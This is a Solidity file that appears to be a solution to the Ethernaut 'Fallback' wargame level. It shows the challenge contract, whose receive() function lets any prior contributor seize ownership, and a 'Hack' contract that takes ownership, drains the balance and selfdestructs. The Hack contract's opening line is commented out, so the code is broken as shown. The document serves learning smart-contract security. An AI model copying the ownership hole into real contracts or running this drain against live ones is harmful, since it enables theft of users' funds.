// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//0xa26d7f7dcE2cC21c8B75a523456F65Ba407c09E8
contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

// contract Hack{
    Fallback private immutable _fallback;
    constructor(address payable __fallback){
        _fallback=Fallback(__fallback);
        
    }
    function attack()external payable{
         _fallback.contribute{value:msg.value}();
        
    }
    function newoner()external payable{
      (bool success,)=address(payable(_fallback)).call{value:msg.value}("");
      require(success);
     
    }
    function withdraw()external{
      _fallback.withdraw();
    }
    receive() external payable { }
    function transferMoney()external {
      selfdestruct(payable(msg.sender));
    }
  
}
